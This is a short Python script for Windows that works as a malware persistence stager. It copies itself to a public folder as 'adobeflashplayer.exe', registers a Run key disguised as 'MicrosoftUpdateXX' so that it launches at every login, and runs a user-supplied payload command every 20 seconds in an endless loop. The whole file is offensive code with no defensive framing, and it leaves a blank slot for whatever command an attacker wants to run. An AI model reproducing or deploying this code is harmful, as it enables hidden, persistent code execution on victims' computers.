import os
import shutil
import sys
from winreg import *
import time
import subprocess

dir = "C:/Users/Public/Libraries/adobeflashplayer.exe"

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)
if not os.path.isfile(dir):
    startup()
payload = "put your payload here"
#every 20 sec shell
while True:
    time.sleep(20)
    subprocess.Popen(payload.split(), shell=True).communicate()